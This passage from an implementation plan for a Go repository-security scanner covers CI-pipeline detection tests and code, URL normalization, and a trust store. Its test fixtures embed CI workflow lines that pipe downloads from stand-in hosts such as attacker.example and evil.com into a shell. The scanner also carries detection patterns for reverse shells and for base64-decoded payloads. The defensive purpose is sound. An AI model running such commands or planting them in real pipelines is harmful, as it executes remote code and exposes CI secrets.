	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestPipelines_GitHubWorkflow_SuspiciousCurlPipe(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup\n        run: |\n          curl -fsSL https://attacker.example/setup.sh | bash\n          go build ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "ci.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|bash in workflow, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestPipelines_GitHubWorkflow_WgetPipeShell(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run deploy\n        run: wget -O - http://evil.com/deploy.sh | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "deploy.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for wget|sh in workflow, got none")
	}
}

func TestPipelines_GitHubWorkflow_Safe(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-go@v5\n        with:\n          go-version: '1.22'\n      - run: go test ./...\n      - run: go vet ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "ci.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe workflow got %d findings, want 0", len(findings))
	}
}

func TestPipelines_GitHubWorkflow_Base64Decode(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: Release\non: [push]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Deploy\n        run: echo \"aGVsbG8=\" | base64 -d | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "release.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for base64 decode pipe, got none")
	}
}

func TestPipelines_GitLabCI_SuspiciousScript(t *testing.T) {
	dir := t.TempDir()
	gitlabCI := "stages:\n  - build\n  - deploy\n\nbuild:\n  stage: build\n  script:\n    - go build ./...\n\ndeploy:\n  stage: deploy\n  script:\n    - curl https://attacker.example/deploy.sh | bash\n    - ./deploy.sh\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitlab-ci.yml"), []byte(gitlabCI), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|bash in .gitlab-ci.yml, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestPipelines_GitLabCI_Safe(t *testing.T) {
	dir := t.TempDir()
	gitlabCI := "stages:\n  - test\n  - build\n\ntest:\n  stage: test\n  image: golang:1.22\n  script:\n    - go test ./...\n    - go vet ./...\n\nbuild:\n  stage: build\n  image: golang:1.22\n  script:\n    - go build -o app ./cmd/app\n  artifacts:\n    paths:\n      - app\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitlab-ci.yml"), []byte(gitlabCI), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe .gitlab-ci.yml got %d findings, want 0", len(findings))
	}
}

func TestPipelines_MultipleWorkflows(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}

	safeWorkflow := "name: Test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: go test ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "test.yml"), []byte(safeWorkflow), 0644); err != nil {
		t.Fatal(err)
	}

	suspiciousWorkflow := "name: Setup\non: [push]\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl http://evil.com/payload | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "setup.yml"), []byte(suspiciousWorkflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding from suspicious workflow, got none")
	}
}

func TestPipelines_Name(t *testing.T) {
	m := scanner.NewPipelinesModule()
	if m.Name() != "ci-pipelines" {
		t.Errorf("Name() = %q, want %q", m.Name(), "ci-pipelines")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestPipelines -v 2>&1 | head -20
```

Expected: compilation error — `NewPipelinesModule` not defined.

### Step 3: Implement the CI pipelines scanner

Create `internal/scanner/pipelines.go`:

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// PipelinesModule scans CI/CD pipeline definitions for suspicious commands.
// Covers GitHub Actions workflows and GitLab CI. Severity: MEDIUM.
type PipelinesModule struct{}

// NewPipelinesModule returns a new PipelinesModule.
func NewPipelinesModule() *PipelinesModule {
	return &PipelinesModule{}
}

// Name returns the module identifier.
func (m *PipelinesModule) Name() string { return "ci-pipelines" }

// pipelinePattern is a heuristic pattern applied line-by-line to pipeline YAML.
type pipelinePattern struct {
	label   string
	pattern *regexp.Regexp
	detail  string
}

// ciSuspiciousPatterns are the heuristics applied to all CI pipeline files.
var ciSuspiciousPatterns = []pipelinePattern{
	{
		label:   "curl pipe shell",
		pattern: regexp.MustCompile(`curl\s[^|]*\|\s*(ba)?sh`),
		detail:  "Downloads and pipes to a shell in CI — can exfiltrate CI secrets (GITHUB_TOKEN, repository secrets) to an external server.",
	},
	{
		label:   "wget pipe shell",
		pattern: regexp.MustCompile(`wget\s[^|]*\|\s*(ba)?sh`),
		detail:  "Downloads and pipes to a shell in CI — can exfiltrate CI secrets to an external server.",
	},
	{
		label:   "base64 decode pipe shell",
		pattern: regexp.MustCompile(`base64\s+-d.*\|\s*(ba)?sh`),
		detail:  "Decodes a base64-encoded payload and executes it in CI — obfuscated command execution.",
	},
	{
		label:   "/dev/tcp in CI",
		pattern: regexp.MustCompile(`/dev/tcp/`),
		detail:  "TCP redirection in a CI step can establish a reverse shell or exfiltrate secrets out of band.",
	},
	{
		label:   "nc reverse shell in CI",
		pattern: regexp.MustCompile(`nc\s+-e\s+`),
		detail:  "netcat -e in CI can open a reverse shell back to an attacker-controlled host.",
	},
}

// Scan checks GitHub Actions workflows and GitLab CI for suspicious pipeline steps.
func (m *PipelinesModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	// Scan .github/workflows/*.yml and *.yaml
	workflowsDir := filepath.Join(sc.RepoPath, ".github", "workflows")
	if entries, err := os.ReadDir(workflowsDir); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			name := entry.Name()
			if !strings.HasSuffix(name, ".yml") && !strings.HasSuffix(name, ".yaml") {
				continue
			}

			info, infoErr := entry.Info()
			if infoErr != nil || info.Size() > maxScriptSize {
				continue
			}

			relPath := filepath.Join(".github", "workflows", name)
			wfPath := filepath.Join(workflowsDir, name)
			if f, scanErr := scanPipelineFile(wfPath, relPath, m.Name()); scanErr == nil {
				findings = append(findings, f...)
			}
		}
	}

	// Scan .gitlab-ci.yml at repo root.
	for _, name := range []string{".gitlab-ci.yml", ".gitlab-ci.yaml"} {
		ciPath := filepath.Join(sc.RepoPath, name)
		if info, err := os.Stat(ciPath); err == nil && info.Size() <= maxScriptSize {
			if f, err := scanPipelineFile(ciPath, name, m.Name()); err == nil {
				findings = append(findings, f...)
			}
		}
	}

	return findings, nil
}

// scanPipelineFile applies all ciSuspiciousPatterns to a pipeline YAML file,
// line by line. Reports at most one finding per pattern per file.
func scanPipelineFile(path, relPath, moduleName string) ([]Finding, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	reported := make(map[string]bool)
	var findings []Finding

	sc := bufio.NewScanner(f)
	lineNum := 0

	for sc.Scan() {
		lineNum++
		line := sc.Text()

		for _, pat := range ciSuspiciousPatterns {
			if reported[pat.label] {
				continue
			}
			if pat.pattern.MatchString(line) {
				reported[pat.label] = true
				findings = append(findings, Finding{
					Severity: Medium,
					Module:   moduleName,
					Path:     relPath,
					Message:  fmt.Sprintf("%s line %d: %s", relPath, lineNum, pat.label),
					Detail:   pat.detail,
				})
			}
		}
	}

	return findings, sc.Err()
}

// walkPipelinesDir is reserved for future support of additional CI systems
// (CircleCI, Azure Pipelines, Drone, etc.) that store configs in subdirectories.
func walkPipelinesDir(root, relBase, moduleName string, findings *[]Finding) {
	_ = filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		name := d.Name()
		if !strings.HasSuffix(name, ".yml") && !strings.HasSuffix(name, ".yaml") {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil || info.Size() > maxScriptSize {
			return nil
		}
		rel, relErr := filepath.Rel(root, path)
		if relErr != nil {
			return nil
		}
		relPath := filepath.Join(relBase, rel)
		if f, scanErr := scanPipelineFile(path, relPath, moduleName); scanErr == nil {
			*findings = append(*findings, f...)
		}
		return nil
	})
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestPipelines -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/pipelines.go internal/scanner/pipelines_test.go
git commit -m "feat: ci-pipelines scanner -- detect suspicious commands in GitHub Actions and GitLab CI (MEDIUM)"
```

---

## Full Test Run for All Tasks 10-14

After all modules are implemented, run the full scanner test suite:

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -race -count=1 -v 2>&1 | grep -E "^(=== RUN|--- PASS|--- FAIL|FAIL|ok)"
```

Expected: all PASS, no FAIL.

### Vet and build check

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go vet ./internal/scanner/
go build ./...
```

Expected: no errors.

---

## Module Registration

Once all modules are implemented, register them in the engine initializer. Add to
`internal/scanner/register.go`:

```go
package scanner

// DefaultEngine returns a new Engine with all detection modules registered in
// priority order (critical modules first, informational modules last).
func DefaultEngine() *Engine {
	e := NewEngine()

	// Critical severity modules — registered first so they appear first in output.
	// (Task 4) e.Register(NewHooksModule())
	// (Task 5) e.Register(NewConfigModule())
	// (Task 6) e.Register(NewConfigIncludeModule())
	// (Task 7) e.Register(NewAttributesModule())
	// (Task 8) e.Register(NewSubmodulesModule())
	// (Task 9) e.Register(NewBareReposModule())

	// High severity modules.
	e.Register(NewSymlinksModule())
	e.Register(NewIDEConfigsModule())
	e.Register(NewDevenvModule())

	// Medium severity modules.
	e.Register(NewScriptsModule())
	e.Register(NewBuildHooksModule())
	e.Register(NewUnicodeModule())
	e.Register(NewPipelinesModule())

	return e
}
```

---

## Summary

| Task | File | Module Name | Severity | Key Detections |
|------|------|------------|----------|----------------|
| 10 | `symlinks.go` | `symlinks` | HIGH | Symlinks escaping repo tree via `filepath.EvalSymlinks` |
| 11 | `ideconfigs.go` | `ide-configs` | HIGH | VS Code `folderOpen` tasks, dangerous settings keys, JetBrains `RunManager` XML |
| 12 | `devenv.go` | `devenv` | HIGH / CRITICAL | devcontainer lifecycle hooks (HIGH), `.envrc` presence (HIGH), `GIT_CONFIG_*` in `.envrc` (CRITICAL) |
| 13 | `scripts.go` | `scripts` | MEDIUM | `curl\|sh`, `wget\|bash`, `/dev/tcp/`, `nc -e`, base64 decode chains, `~/.ssh/id_rsa`, `~/.aws/credentials`, `$GITHUB_TOKEN` |
| 14a | `buildhooks.go` | `build-hooks` | MEDIUM | npm `preinstall`/`postinstall`/`prepare`, Makefile `$(shell)`, `setup.py` subprocess |
| 14b | `unicode.go` | `unicode` | MEDIUM | BiDi control characters U+200E/200F/202A-202E/2066-2069 (Trojan Source CVE-2021-42574) |
| 14c | `pipelines.go` | `ci-pipelines` | MEDIUM | `curl\|sh`/`wget\|bash`/base64 decode in `.github/workflows/*.yml` and `.gitlab-ci.yml` |
# git-protect Tasks 15–24: Complete Go Implementation

Module path: `github.com/moldabekov/git-protect`

---

## Task 15: URL Normalization

### `internal/trust/url.go`

```go
package trust

import (
	"net"
	"net/url"
	"path/filepath"
	"strings"
	"unicode/utf8"

	"golang.org/x/net/idna"
)

// Normalize converts any git URL form into a canonical host/path string
// suitable for trust-store matching. The returned string has no scheme,
// no trailing slash, no .git suffix, and no user@ prefix.
// Returns ("", false) for local paths (file:// or bare /path).
func Normalize(raw string) (string, bool) {
	if IsLocalPath(raw) {
		return "", false
	}

	// Handle SCP-style SSH: git@github.com:org/repo.git
	if !strings.Contains(raw, "://") && strings.Contains(raw, ":") {
		// Must look like user@host:path or host:path
		atIdx := strings.Index(raw, "@")
		colonIdx := strings.Index(raw, ":")
		if atIdx < colonIdx {
			// has user@host:path form
			hostPart := raw[atIdx+1 : colonIdx]
			pathPart := raw[colonIdx+1:]
			return normalizeParts(hostPart, pathPart), true
		} else if atIdx == -1 {
			// host:path with no user
			hostPart := raw[:colonIdx]
			pathPart := raw[colonIdx+1:]
			return normalizeParts(hostPart, pathPart), true
		}
	}

	// Parse as standard URL
	u, err := url.Parse(raw)
	if err != nil {
		return "", false
	}

	host := u.Hostname()
	port := u.Port()
	scheme := strings.ToLower(u.Scheme)

	// Strip default ports
	if (scheme == "https" && port == "443") ||
		(scheme == "http" && port == "80") ||
		(scheme == "ssh" && port == "22") ||
		(scheme == "git" && port == "9418") {
		port = ""
	}

	if port != "" {
		host = net.JoinHostPort(host, port)
	}

	return normalizeParts(host, u.Path), true
}

// normalizeParts cleans host and path and joins them.
func normalizeParts(host, path string) string {
	host = normalizeHost(host)
	path = normalizePath(path)
	if path == "" {
		return host
	}
	return host + "/" + path
}

// normalizeHost lowercases, punycode-decodes IDN, strips user@ if present.
func normalizeHost(host string) string {
	// Strip user@ if sneaked in
	if idx := strings.Index(host, "@"); idx != -1 {
		host = host[idx+1:]
	}
	host = strings.ToLower(strings.TrimSpace(host))

	// Decode IDN/punycode to Unicode for canonical form then back to ASCII
	// to prevent homograph attacks (gíthub.com != github.com).
	// We normalize to ASCII (punycode) so matching is byte-exact.
	if p, err := idna.Lookup.ToASCII(host); err == nil {
		host = p
	}
	return host
}

// normalizePath strips leading slash, .git suffix, trailing slash,
// user@ prefixes inside paths, and percent-decodes segments.
func normalizePath(path string) string {
	// Percent-decode
	if dec, err := url.PathUnescape(path); err == nil && utf8.ValidString(dec) {
		path = dec
	}

	path = strings.TrimPrefix(path, "/")
	path = strings.TrimSuffix(path, "/")
	path = strings.TrimSuffix(path, ".git")
	path = strings.TrimSuffix(path, "/") // in case ".git/" had trailing slash

	// Collapse any double slashes
	for strings.Contains(path, "//") {
		path = strings.ReplaceAll(path, "//", "/")
	}

	return path
}

// IsLocalPath returns true for file:// URLs and bare filesystem paths
// (absolute paths starting with /, relative paths, or paths with no host).
func IsLocalPath(raw string) bool {
	if strings.HasPrefix(raw, "file://") {
		return true
	}
	// Absolute path
	if strings.HasPrefix(raw, "/") {
		return true
	}
	// Relative paths like ./foo or ../bar or just foo
	if strings.HasPrefix(raw, "./") || strings.HasPrefix(raw, "../") {
		return true
	}
	// filepath.IsAbs handles Windows C:\ etc.
	if filepath.IsAbs(raw) {
		return true
	}
	// Has no scheme and looks like a bare path (no dot-com host)
	if !strings.Contains(raw, "://") && !strings.Contains(raw, ":") && !strings.Contains(raw, ".") {
		return true
	}
	return false
}
```

### `internal/trust/url_test.go`

```go
package trust_test

import (
	"testing"

	"github.com/moldabekov/git-protect/internal/trust"
)

func TestNormalize(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		want     string
		wantOK   bool
	}{
		// HTTPS variants
		{
			name:   "https basic",
			input:  "https://github.com/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "https no git suffix",
			input:  "https://github.com/org/repo",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "https trailing slash",
			input:  "https://github.com/org/repo/",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "https with default port 443",
			input:  "https://github.com:443/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "https with non-default port",
			input:  "https://github.com:8443/org/repo.git",
			want:   "github.com:8443/org/repo",
			wantOK: true,
		},
		// SSH variants
		{
			name:   "ssh scp style git@",
			input:  "git@github.com:org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "ssh scp no user",
			input:  "github.com:org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "ssh:// url",
			input:  "ssh://git@github.com/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		{
			name:   "ssh:// with default port 22",
			input:  "ssh://github.com:22/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		// git:// protocol
		{
			name:   "git protocol",
			input:  "git://github.com/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		// http
		{
			name:   "http basic",
			input:  "http://github.com/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		// Local paths — must return false
		{
			name:   "file:// scheme",
			input:  "file:///home/user/repo",
			want:   "",
			wantOK: false,
		},
		{
			name:   "absolute path",
			input:  "/home/user/repo",
			want:   "",
			wantOK: false,
		},
		{
			name:   "relative path dot-slash",
			input:  "./myrepo",
			want:   "",
			wantOK: false,
		},
		{
			name:   "relative path dot-dot",
			input:  "../sibling",
			want:   "",
			wantOK: false,
		},
		// Percent encoding
		{
			name:   "percent-encoded path",
			input:  "https://github.com/org/my%2Drepo.git",
			want:   "github.com/org/my-repo",
			wantOK: true,
		},
		// Case insensitivity of host
		{
			name:   "uppercase host",
			input:  "https://GITHUB.COM/org/repo.git",
			want:   "github.com/org/repo",
			wantOK: true,
		},
		// Nested path (deep)
		{
			name:   "gitlab subgroup",
			input:  "https://gitlab.com/group/subgroup/repo.git",
			want:   "gitlab.com/group/subgroup/repo",
			wantOK: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := trust.Normalize(tt.input)
			if ok != tt.wantOK {
				t.Errorf("Normalize(%q) ok=%v, want %v", tt.input, ok, tt.wantOK)
			}
			if got != tt.want {
				t.Errorf("Normalize(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestIsLocalPath(t *testing.T) {
	locals := []string{
		"/home/user/repo",
		"./repo",
		"../repo",
		"file:///tmp/repo",
	}
	nonLocals := []string{
		"https://github.com/org/repo",
		"git@github.com:org/repo.git",
		"ssh://github.com/org/repo",
	}

	for _, p := range locals {
		if !trust.IsLocalPath(p) {
			t.Errorf("IsLocalPath(%q) = false, want true", p)
		}
	}
	for _, p := range nonLocals {
		if trust.IsLocalPath(p) {
			t.Errorf("IsLocalPath(%q) = true, want false", p)
		}
	}
}
```

---

## Task 16: Trust Store + Pattern Matching

### `internal/trust/store.go`

```go
package trust

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/BurntSushi/toml"
)

// Entry represents one row in the trust store.
type Entry struct {
	Pattern string    `toml:"pattern"`
	Type    string    `toml:"type"` // "repo", "org", "host"
	Added   time.Time `toml:"added"`
	Note    string    `toml:"note,omitempty"`
}

// trustFile is the on-disk TOML structure.
type trustFile struct {
	Trust []Entry `toml:"trust"`
}

// Store manages the TOML trust store with strict security invariants.
type Store struct {
	path string
}

// NewStore creates a Store for the given path. The path need not exist yet.
func NewStore(path string) *Store {
	return &Store{path: path}
}

// Load reads and validates the trust store from disk.
// Returns an empty list if the file does not exist yet.
// Returns an error if:
//   - the path is a symlink
//   - the file permissions are not exactly 0600
//   - TOML parsing fails
func (s *Store) Load() ([]Entry, error) {
	// Symlink check via Lstat (does not follow symlinks)
	info, err := os.Lstat(s.path)
	if os.IsNotExist(err) {
		return nil, nil
	}
	if err != nil {
		return nil, fmt.Errorf("trust store stat: %w", err)
	}
	if info.Mode()&os.ModeSymlink != 0 {
		return nil, fmt.Errorf("trust store %q is a symlink — refusing to load (security policy)", s.path)
	}
	if info.Mode().Perm() != 0600 {
		return nil, fmt.Errorf("trust store %q has unsafe permissions %04o — expected 0600", s.path, info.Mode().Perm())
	}

	data, err := os.ReadFile(s.path)
	if err != nil {
		return nil, fmt.Errorf("trust store read: %w", err)
	}

	var tf trustFile
	if err := toml.Unmarshal(data, &tf); err != nil {
		return nil, fmt.Errorf("trust store parse: %w", err)
	}
	return tf.Trust, nil
}

// Add appends a new entry to the trust store.
func (s *Store) Add(e Entry) error {
	entries, err := s.Load()
	if err != nil {
		return err
	}
	// Deduplicate by pattern
	for _, existing := range entries {
		if existing.Pattern == e.Pattern {
			return nil // already present, idempotent
		}
	}
	if e.Added.IsZero() {
		e.Added = time.Now().UTC().Truncate(24 * time.Hour)
	}
	entries = append(entries, e)
	return s.save(entries)
}

// Remove deletes an entry by pattern. Returns nil if the pattern was not found.
func (s *Store) Remove(pattern string) error {
	entries, err := s.Load()
	if err != nil {
		return err
	}
	filtered := entries[:0]
	for _, e := range entries {
		if e.Pattern != pattern {
			filtered = append(filtered, e)
		}
	}
	return s.save(filtered)
}

// save writes the entries atomically: temp file → fsync → rename.
func (s *Store) save(entries []Entry) error {
	if err := os.MkdirAll(filepath.Dir(s.path), 0700); err != nil {
		return fmt.Errorf("trust store mkdir: %w", err)
	}

	// Write to a sibling temp file
	dir := filepath.Dir(s.path)
	tmp, err := os.CreateTemp(dir, ".trust-*.toml.tmp")
	if err != nil {
		return fmt.Errorf("trust store temp create: %w", err)
	}
	tmpName := tmp.Name()

	// Clean up temp file on any error path
	ok := false
	defer func() {
		if !ok {
			tmp.Close()
			os.Remove(tmpName)
		}
	}()

	// Set 0600 before writing
	if err := tmp.Chmod(0600); err != nil {
		return fmt.Errorf("trust store chmod: %w", err)
	}

	tf := trustFile{Trust: entries}
	enc := toml.NewEncoder(tmp)
	if err := enc.Encode(tf); err != nil {
		return fmt.Errorf("trust store encode: %w", err)
	}

	if err := tmp.Sync(); err != nil {
		return fmt.Errorf("trust store fsync: %w", err)
	}
	if err := tmp.Close(); err != nil {
		return fmt.Errorf("trust store close: %w", err)
	}

	// Atomic rename
	if err := os.Rename(tmpName, s.path); err != nil {
		return fmt.Errorf("trust store rename: %w", err)
	}
	ok = true
	return nil
}

// IsTrusted returns true if the normalized form of rawURL matches any entry.
// Local paths always return false.
func (s *Store) IsTrusted(rawURL string) (bool, error) {
	norm, ok := Normalize(rawURL)
	if !ok {
		// Local path — never trusted
		return false, nil
	}
	entries, err := s.Load()
	if err != nil {
		return false, err
	}
	return MatchAny(norm, entries), nil
}
```

### `internal/trust/match.go`

```go
package trust

import "strings"

// MatchAny returns true if normalizedURL matches at least one trust entry.
func MatchAny(normalizedURL string, entries []Entry) bool {
	for _, e := range entries {
		if Match(normalizedURL, e.Pattern) {
			return true
		}
	}
	return false
}

// Match checks whether normalizedURL matches the given pattern.
//
// Pattern types (inferred from the pattern string, not the Entry.Type field,
// so that pattern matching is self-contained and testable without a full Entry):
//
//   - Exact match:   "github.com/org/repo"        → matches only that repo
//   - Org wildcard:  "github.com/org/*"            → matches any repo under org
//   - Host wildcard: "github.com/*"                → matches all repos on host
//
// Both normalizedURL and pattern are already normalized (lowercase, no scheme,
// no .git suffix). The function is case-insensitive as an additional safety net.
func Match(normalizedURL, pattern string) bool {
	url := strings.ToLower(normalizedURL)
	pat := strings.ToLower(pattern)

	if !strings.HasSuffix(pat, "/*") {
		// Exact match
		return url == pat
	}

	// Prefix match: strip trailing "/*" and check that url starts with prefix + "/"
	prefix := strings.TrimSuffix(pat, "/*")
	return url == prefix || strings.HasPrefix(url, prefix+"/")
}
```

### `internal/trust/store_test.go`

```go
package trust_test

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/moldabekov/git-protect/internal/trust"
)

func newTempStore(t *testing.T) (*trust.Store, string) {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "trust.toml")
	return trust.NewStore(path), path
}

func TestStoreAddListRemove(t *testing.T) {
	s, _ := newTempStore(t)

	// Empty initially
	entries, err := s.Load()
	if err != nil {
		t.Fatalf("Load empty: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("expected 0 entries, got %d", len(entries))
	}

	// Add an entry
	err = s.Add(trust.Entry{
		Pattern: "github.com/myorg/*",
		Type:    "org",
		Added:   time.Date(2026, 5, 20, 0, 0, 0, 0, time.UTC),
		Note:    "test org",
	})
	if err != nil {
		t.Fatalf("Add: %v", err)
	}

	entries, err = s.Load()
	if err != nil {
		t.Fatalf("Load after Add: %v", err)
	}
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Pattern != "github.com/myorg/*" {
		t.Errorf("pattern = %q, want %q", entries[0].Pattern, "github.com/myorg/*")
	}

	// Add duplicate — should be idempotent
	err = s.Add(trust.Entry{Pattern: "github.com/myorg/*", Type: "org"})
	if err != nil {
		t.Fatalf("Add duplicate: %v", err)
	}
	entries, _ = s.Load()
	if len(entries) != 1 {
		t.Errorf("duplicate add created extra entry, got %d entries", len(entries))
	}

	// Remove
	err = s.Remove("github.com/myorg/*")
	if err != nil {
		t.Fatalf("Remove: %v", err)
	}
	entries, _ = s.Load()
	if len(entries) != 0 {
		t.Errorf("after Remove expected 0 entries, got %d", len(entries))
	}
}

func TestStoreFilePermissions(t *testing.T) {
	s, path := newTempStore(t)

	err := s.Add(trust.Entry{Pattern: "github.com/test/repo", Type: "repo"})
	if err != nil {
		t.Fatalf("Add: %v", err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("Stat: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0600 {
		t.Errorf("trust store permissions = %04o, want 0600", perm)
	}
}

func TestStoreRejectsSymlink(t *testing.T) {
	dir := t.TempDir()
	realFile := filepath.Join(dir, "real.toml")
	linkFile := filepath.Join(dir, "trust.toml")

	// Create a real file with 0600
	if err := os.WriteFile(realFile, []byte(""), 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(realFile, linkFile); err != nil {
		t.Skip("symlinks not supported on this filesystem")
	}

	s := trust.NewStore(linkFile)
	_, err := s.Load()
	if err == nil {
		t.Fatal("expected error for symlink trust store, got nil")
	}
}

func TestStoreRejectsWrongPermissions(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "trust.toml")

	// Write a valid TOML file but with wrong permissions
	if err := os.WriteFile(path, []byte(""), 0644); err != nil {
		t.Fatal(err)
	}

	s := trust.NewStore(path)
	_, err := s.Load()
	if err == nil {
		t.Fatal("expected error for wrong permissions, got nil")
	}
}

func TestStoreIsTrusted(t *testing.T) {
	s, _ := newTempStore(t)

	_ = s.Add(trust.Entry{Pattern: "github.com/myorg/*", Type: "org"})
	_ = s.Add(trust.Entry{Pattern: "github.com/torvalds/linux", Type: "repo"})
	_ = s.Add(trust.Entry{Pattern: "gitlab.internal.corp/*", Type: "host"})

	trusted := []string{
		"https://github.com/myorg/any-repo.git",
		"git@github.com:myorg/another.git",
		"https://github.com/torvalds/linux",
		"https://gitlab.internal.corp/team/project",
	}
	untrusted := []string{
		"https://github.com/evil/repo",
		"https://evil.com/myorg/repo",
		"/home/user/localrepo",
		"file:///tmp/repo",
	}

	for _, url := range trusted {
